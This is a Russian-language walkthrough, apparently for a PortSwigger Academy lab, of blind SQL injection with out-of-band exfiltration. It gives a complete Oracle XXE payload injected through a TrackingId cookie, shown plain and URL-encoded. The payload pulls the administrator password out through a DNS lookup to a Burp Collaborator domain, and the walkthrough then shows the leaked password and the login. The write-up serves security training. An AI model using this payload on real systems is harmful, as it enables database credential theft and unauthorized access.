Перейдем на корневую страницу, и найдем в `Proxy` -> `HTTP history` запрос, содержащий `Cookie`, и отправим его в `Repeater`
```
GET /
Cookie: TrackingId=rnmv0m5YblI4LwWw;
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/13.%20Blind%20SQL%20injection%20with%20out-of-band%20data%20exfiltration/pics%20for%20walktrough/1.png)
Далее перейдем в читлист, предлагаемый авторами лабораторной работы, и найдем там запрос для Oracle DB
```
https://portswigger.net/web-security/sql-injection/cheat-sheet
```
И найдем там следующий запрос
```
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```
далее в этот запрос нам нужно вписать нашу квери, которая нам поможет узнать пароль от админа
и хост, на который будет слаться запрос


сформируем квери 
```
SELECT password from users where username='administrator'
```
И сформируем DGA-домен, на который будет выполнен запрос с пароем от админа с помощью `Collaborator`
```
y21plrbn2c2g5nrtthb56qdrkiq9ez2o.oastify.com
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/13.%20Blind%20SQL%20injection%20with%20out-of-band%20data%20exfiltration/pics%20for%20walktrough/2.png)
Далее соберем все вышеперечисленное воедино
```
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username='administrator')||'.y21plrbn2c2g5nrtthb56qdrkiq9ez2o.oastify.com/"> %remote;]>'),'/l') FROM dual
```
Полный наш запрос будет выглядеть как 
```
...
Cookie: TrackingId=rnmv0m5YblI4LwWw' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username='administrator')||'.y21plrbn2c2g5nrtthb56qdrkiq9ez2o.oastify.com/"> %remote;]>'),'/l') FROM dual)--;
...
```
Или же в URL кодировке (ctrl+U)
```
Cookie: TrackingId=rnmv0m5YblI4LwWw' ||(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+from+users+where+username%3d'administrator')||'.y21plrbn2c2g5nrtthb56qdrkiq9ez2o.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual)--;
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/13.%20Blind%20SQL%20injection%20with%20out-of-band%20data%20exfiltration/pics%20for%20walktrough/3.png)
Следуюзщим этапом вернемся в раздел `Collaborator`, нажмем на `poll now`, и увидим, какой запрос поступил на наш DGA-домен
```
brhg1rc4d8lncnzsqpck.y21plrbn2c2g5nrtthb56qdrkiq9ez2o.oastify.com.
```
где `brhg1rc4d8lncnzsqpck` пароль от УЗ Administrator, а `y21plrbn2c2g5nrtthb56qdrkiq9ez2o.oastify.com` наш DGA-домен, сформированный ранее
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/13.%20Blind%20SQL%20injection%20with%20out-of-band%20data%20exfiltration/pics%20for%20walktrough/4.png)
Залогинимся под `administrator:brhg1rc4d8lncnzsqpck` и получим уведомление об успешно выполненной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/13.%20Blind%20SQL%20injection%20with%20out-of-band%20data%20exfiltration/pics%20for%20walktrough/5.png)
